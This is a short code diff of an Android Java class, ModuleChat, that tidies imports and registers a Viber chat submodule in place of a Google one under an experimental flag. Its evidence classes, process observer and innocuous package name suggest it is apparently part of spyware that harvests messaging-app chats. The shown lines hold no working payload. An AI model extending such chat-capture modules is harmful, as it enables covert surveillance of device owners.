@@ -1,45 +1,13 @@
 package com.android.deviceinfo.module;
 
-import java.io.File;
-import java.io.FileReader;
-import java.io.IOException;
 import java.util.ArrayList;
-import java.util.Date;
-import java.util.Enumeration;
-import java.util.Hashtable;
 
-import javax.xml.parsers.DocumentBuilderFactory;
-import javax.xml.parsers.FactoryConfigurationError;
-import javax.xml.parsers.ParserConfigurationException;
-
-import org.w3c.dom.Document;
-import org.w3c.dom.Element;
-import org.w3c.dom.NamedNodeMap;
-import org.w3c.dom.Node;
-import org.w3c.dom.NodeList;
-import org.xml.sax.SAXException;
-import org.xmlpull.v1.XmlPullParser;
-
-import android.database.Cursor;
-import android.database.sqlite.SQLiteDatabase;
-import android.database.sqlite.SQLiteQueryBuilder;
-import android.os.Message;
-import android.util.Pair;
-import android.util.Xml;
-
-import com.android.deviceinfo.Messages;
 import com.android.deviceinfo.ProcessInfo;
-import com.android.deviceinfo.ProcessStatus;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
-import com.android.deviceinfo.capabilities.XmlParser;
 import com.android.deviceinfo.conf.ConfModule;
-import com.android.deviceinfo.db.GenericSqliteHelper;
-import com.android.deviceinfo.evidence.EvDispatcher;
 import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.EvidenceType;
-import com.android.deviceinfo.evidence.Markup;
-import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.listener.ListenerProcess;
 import com.android.deviceinfo.module.chat.ChatFacebook;
@@ -53,7 +21,6 @@ import com.android.deviceinfo.module.chat.MessageChat;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DateTime;
-import com.android.deviceinfo.util.StringUtils;
 import com.android.deviceinfo.util.WChar;
 
 
@@ -67,7 +34,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		subModuleManager = new SubModuleManager(this);
 
 		if (Cfg.ENABLE_EXPERIMENTAL_MODULES) {
-			subModuleManager.add(new ChatGoogle());
+			subModuleManager.add(new ChatViber());
 			
 		} else {
 			subModuleManager.add(new ChatFacebook());
